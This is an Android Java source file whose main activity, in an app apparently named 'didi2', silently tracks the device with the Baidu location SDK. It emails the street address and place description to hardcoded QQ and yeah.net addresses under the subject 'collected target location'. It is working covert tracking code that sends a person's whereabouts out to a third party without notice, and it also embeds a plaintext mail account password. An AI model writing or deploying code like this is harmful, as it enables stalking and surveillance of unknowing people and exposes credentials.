package com.naruto.didi2.activity;

import android.content.SharedPreferences;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.widget.TextView;

import com.baidu.location.BDAbstractLocationListener;
import com.baidu.location.BDLocation;
import com.baidu.location.LocationClient;
import com.baidu.location.LocationClientOption;
import com.naruto.didi2.R;
import com.naruto.didi2.constant.Constants;
import com.naruto.didi2.util.LogUtils;

import java.util.Date;
import java.util.Properties;

import javax.mail.Authenticator;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;

public class MainActivity extends AppCompatActivity {

    private TextView main_txt;
    private SharedPreferences preferences;
    private final String SSL_FACTORY = "javax.net.ssl.SSLSocketFactory";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        initView();
        initSP();
        initLocationOption();
    }

    /**
     * 初始化定位参数配置
     */

    private void initLocationOption() {
        //定位服务的客户端。宿主程序在客户端声明此类，并调用，目前只支持在主线程中启动
        LocationClient locationClient = new LocationClient(getApplicationContext());
        //声明LocationClient类实例并配置定位参数
        LocationClientOption locationOption = new LocationClientOption();
        MyLocationListener myLocationListener = new MyLocationListener();
        //注册监听函数
        locationClient.registerLocationListener(myLocationListener);
        //可选，默认高精度，设置定位模式，高精度，低功耗，仅设备
        locationOption.setLocationMode(LocationClientOption.LocationMode.Hight_Accuracy);
        //可选，默认gcj02，设置返回的定位结果坐标系，如果配合百度地图使用，建议设置为bd09ll;
        locationOption.setCoorType("gcj02");
        //可选，默认0，即仅定位一次，设置发起连续定位请求的间隔需要大于等于1000ms才是有效的
        locationOption.setScanSpan(1000);
        //可选，设置是否需要地址信息，默认不需要
        locationOption.setIsNeedAddress(true);
        //可选，设置是否需要地址描述
        locationOption.setIsNeedLocationDescribe(true);
        //可选，设置是否需要设备方向结果
        locationOption.setNeedDeviceDirect(false);
        //可选，默认false，设置是否当gps有效时按照1S1次频率输出GPS结果
        locationOption.setLocationNotify(true);
        //可选，默认true，定位SDK内部是一个SERVICE，并放到了独立进程，设置是否在stop的时候杀死这个进程，默认不杀死
        locationOption.setIgnoreKillProcess(true);
        //可选，默认false，设置是否需要位置语义化结果，可以在BDLocation.getLocationDescribe里得到，结果类似于“在北京天安门附近”
        locationOption.setIsNeedLocationDescribe(true);
        //可选，默认false，设置是否需要POI结果，可以在BDLocation.getPoiList里得到
        locationOption.setIsNeedLocationPoiList(true);
        //可选，默认false，设置是否收集CRASH信息，默认收集
        locationOption.SetIgnoreCacheException(false);
        //可选，默认false，设置是否开启Gps定位
        locationOption.setOpenGps(true);
        //可选，默认false，设置定位时是否需要海拔信息，默认不需要，除基础定位版本都可用
        locationOption.setIsNeedAltitude(false);
        //设置打开自动回调位置模式，该开关打开后，期间只要定位SDK检测到位置变化就会主动回调给开发者，该模式下开发者无需再关心定位间隔是多少，定位SDK本身发现位置变化就会及时回调给开发者
        locationOption.setOpenAutoNotifyMode();
        //设置打开自动回调位置模式，该开关打开后，期间只要定位SDK检测到位置变化就会主动回调给开发者
        locationOption.setOpenAutoNotifyMode(3000, 1, LocationClientOption.LOC_SENSITIVITY_HIGHT);
        //需将配置好的LocationClientOption对象，通过setLocOption方法传递给LocationClient对象使用
        locationClient.setLocOption(locationOption);
        //开始定位
        locationClient.start();
    }

    private void initView() {
        main_txt = (TextView) findViewById(R.id.main_txt);
    }

    private void initSP() {
        preferences = getSharedPreferences("user", 0);
    }

    /**
     * 实现定位回调
     */
    public class MyLocationListener extends BDAbstractLocationListener {
        @Override
        public void onReceiveLocation(BDLocation location) {
            //此处的BDLocation为定位结果信息类，通过它的各种get方法可获取定位相关的全部结果
            //以下只列举部分获取经纬度相关（常用）的结果信息
            //更多结果信息获取说明，请参照类参考中BDLocation类中的说明

            //获取详细地址信息
            String addrStr = location.getAddrStr();
            Log.e(Constants.TAG, "所在位置: " + addrStr);
            Log.e(Constants.TAG, "onReceiveLocation: ");
//            Toast.makeText(MainActivity.this,"所在位置: " +addrStr,Toast.LENGTH_LONG).show();
            String locationDescribe = location.getLocationDescribe();
//            Toast.makeText(MainActivity.this, "语义化描述: " + locationDescribe, Toast.LENGTH_LONG).show();
            if (addrStr != null || locationDescribe != null) {
                //发送邮件

                String s = addrStr + "\n" + locationDescribe;
                main_txt.setText(s);
                Log.e(Constants.TAG, "拿到位置信息");
                boolean isFirst = preferences.getBoolean("isFirst", true);
                if (isFirst) {
//                    initProgressBar();
                    Log.e(Constants.TAG, "开始发送: ");
//                    SharedPreferences.Editor edit = preferences.edit();
//                    edit.putBoolean("isFirst", false);
//                    edit.commit();
                    send(s);
                } else {
                    Log.e(Constants.TAG, "已发送过邮件 ");
                }



            Log.e(Constants.TAG, "onReceiveLocation: "+Thread.currentThread().getId() );
            //获取纬度信息
            double latitude = location.getLatitude();
            //获取经度信息
            double longitude = location.getLongitude();
            //获取定位精度，默认值为0.0f
            float radius = location.getRadius();
            //获取经纬度坐标类型，以LocationClientOption中设置过的坐标类型为准
            String coorType = location.getCoorType();
            //获取定位类型、定位错误返回码，具体信息可参照类参考中BDLocation类中的说明
            int errorCode = location.getLocType();
            Log.e(Constants.TAG, "错误码: " + errorCode);
//            Toast.makeText(MainActivity.this,"错误码: " + errorCode,Toast.LENGTH_SHORT).show();
            }
        }
    }

    private void send(final String s1) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
//                    String threes = getThirdAppList(context);
//                    Thread.sleep(2000);
//                    progressDialog.dismiss();
//                    handler.sendEmptyMessage(1);
                    Transport.send(createMimeMessage("采集到目标位置", s1));
                    SharedPreferences.Editor edit = preferences.edit();
                    edit.putBoolean("isFirst", false);
                    edit.commit();
                    Log.e(Constants.TAG, "发送成功");
                } catch (Exception e) {
                    Log.e(Constants.TAG, "发送失败, exception: " + e.getMessage());
                }
            }
        }).start();
    }

    private MimeMessage createMimeMessage(String title, String content) {
        // 判断是否需要身份认证
        Properties pro = getProperties();
        // 如果需要身份认证，则创建一个密码验证器
        MailAuthenticator authenticator = new MailAuthenticator("tysj78@yeah.net", "mm0700");
        // 根据邮件会话属性和密码验证器构造一个发送邮件的session
        Session session = Session.getInstance(pro, authenticator);
        MimeMessage msg = new MimeMessage(session);
        try {
            //发件人
            msg.setFrom(new InternetAddress("tysj78@yeah.net"));
            //收件人
//            InternetAddress[] addresses = new InternetAddress[]{new InternetAddress("2553601218@qq.com")};jdxk007@163.com
            msg.setRecipients(Message.RecipientType.CC, "tysj78@yeah.net");
            msg.setRecipients(Message.RecipientType.TO, "2553601218@qq.com");
            msg.setSubject(title);
            msg.setSentDate(new Date());
            msg.setText(content, "UTF-8");
        } catch (MessagingException mex) {
            LogUtils.e("发送邮件异常");
        }
        return msg;
    }

    public Properties getProperties() {
        Properties p = System.getProperties();
        p.put("mail.smtp.host", "smtp.yeah.net");
        p.put("mail.smtp.auth", "true");
        p.put("mail.smtp.connectiontimeout", 8000);
        return p;
    }

    public class MailAuthenticator extends Authenticator {

        String userName = "";
        String password = "";

        public MailAuthenticator() {
        }

        public MailAuthenticator(String username, String password) {
            this.userName = username;
            this.password = password;
        }

        // 这个方法在Authenticator内部会调用
        protected PasswordAuthentication getPasswordAuthentication() {
            return new PasswordAuthentication(userName, password);
        }

    }
}
